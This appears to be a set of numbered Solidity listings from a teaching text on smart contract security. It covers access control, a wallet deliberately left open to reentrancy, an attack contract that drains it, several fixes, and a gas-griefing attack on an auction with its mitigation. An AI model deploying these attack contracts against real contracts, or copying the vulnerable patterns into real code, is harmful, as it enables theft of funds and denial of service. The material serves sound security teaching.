//8.1
uint256 length = array.length;
for(uint256 i = 0; i < length;) {
   doSomething(array[i]);
   unchecked{ i++; }
}

//8.2
contract RawContract {
   string internal message = "Hello World!";

   function getMessage() public view returns (string memory) {
       return message;
   }

   function setMessage(string calldata newMessage) external {
       message = newMessage;
   }
}

//8.3
abstract contract Ownable {
   address private _owner;

   constructor() {
       _owner = msg.sender;
   }

   function transferOwnership(address newOwner) public onlyOwner {
       _owner = newOwner;
   }

   modifier onlyOwner() {
       require(_owner == msg.sender, "You do not have permission");
       _;
   }
}

//8.4
contract RawContract is Ownable {
   string internal message = "Hello World!";

   function getMessage() public view returns (string memory) {
       return message;
   }

   function setMessage(string calldata newMessage) external onlyOwner {
       message = newMessage;
   }
}

//8.5
abstract contract AcessControl {
   enum Role {
       NONE,
       OWNER,
       MANAGER,
       CUSTOMER
   }

   mapping(address => Role) private _roles;

   constructor(){
       _roles[msg.sender] = Role.OWNER;
   }

   modifier onlyRole(Role role) {
       require(_roles[msg.sender] == role, "You do not have permission");
       _;
   }

   function setRole(Role role, address account) public onlyRole(Role.OWNER) {
       if (_roles[account] !=  role) {
           _roles[account] = role;
       }
   }
}

//8.6
contract RawContract is AcessControl {
   string internal message = "Hello World!";

   function getMessage() public view returns (string memory) {
       return message;
   }

   function setMessage(string calldata newMessage) external onlyRole(Role.MANAGER) {
       message = newMessage;
   }
}

//8.7
contract Carteira {
   mapping(address => uint) public balances;

   constructor() {}

   function deposit() external payable {
       balances[msg.sender] += msg.value;
   }

   function withdraw(uint amount) external {
       require(balances[msg.sender] >= amount, "Insufficient funds");
       payable(msg.sender).transfer(amount);
       balances[msg.sender] -= amount;
   }
}

//8.8
interface IReentrancy {
   function deposit() external payable;
   function withdraw(uint amount) external;
}

contract ReentrancyAttack {
   IReentrancy private immutable target;

   constructor(address targetAddress) {
       target = IReentrancy(targetAddress);
   }

   function attack() external payable {
       target.deposit{value: msg.value}();
       target.withdraw(msg.value);
   }

   receive() external payable {
       if (address(target).balance >= msg.value) target.withdraw(msg.value);
   }
}

//8.9
function withdraw2(uint amount) external {
   require(balances[msg.sender] >= amount, "Insufficient balance");
   balances[msg.sender] -= amount;
   payable(msg.sender).transfer(amount);
}

//8.10
bool private isProcessing = false;

function withdraw3(uint amount) external {
   require(!isProcessing, "Reentry blocked");
   isProcessing = true;

   require(balances[msg.sender] >= amount, "Insufficient funds");
   balances[msg.sender] -= amount;
   payable(msg.sender).transfer(amount);

   isProcessing = false;
}

//8.11
import "@openzeppelin/contracts/security/ReentrancyGuard.sol"

function withdraw4(uint amount) external nonReentrant {
   require(balances[msg.sender] >= amount, "Insufficient funds");
   balances[msg.sender] -= amount;
   payable(msg.sender).transfer(amount);
}

//8.12
contract Auction {
   address public highestBidder;
   uint256 public highestBid;
   uint256 public auctionEnd;

   constructor(){
       auctionEnd = block.timestamp + (7 * 24 * 60 * 60);//7 days in the future
   }

   function bid() external payable {
       require(msg.value > highestBid, "Bid is not high enough");
       require(block.timestamp <= auctionEnd, "Auction finished");

       //refund the previous highest bidder
       if (highestBidder != address(0)) {
           (bool success, ) = highestBidder.call{value: highestBid}("");
           require(success, "refund failed");
       }

       highestBidder = msg.sender;
       highestBid = msg.value;
   }
}

//8.13
interface IAuction {
   function bid() external payable;
}

contract GasGriefingAttack {
   function attack(address _auction) external payable {
       IAuction(_auction).bid{value: msg.value}();
   }

   receive() external payable {
       keccak256("just wasting some gas...");
       keccak256("just wasting some gas...");
       keccak256("just wasting some gas...");
       keccak256("just wasting some gas...");
       keccak256("just wasting some gas...");
       //etc...
   }
}

//8.14
contract Auction {
   address public highestBidder;
   uint256 public highestBid;
   uint256 public auctionEnd;

   constructor(){
       auctionEnd = block.timestamp + (7 * 24 * 60 * 60);//7 days in the future
   }

   function bid() external payable {
       require(msg.value > highestBid, "Bid is not high enough");
       require(block.timestamp <= auctionEnd, "Auction finished");

       //refund the previous highest bidder
       if (highestBidder != address(0)) {
           bool success = payable(highestBidder).send(highestBid);
           //save the failed ones and treat them later, to don't block the business flow
       }

       highestBidder = msg.sender;
       highestBid = msg.value;
   }
}
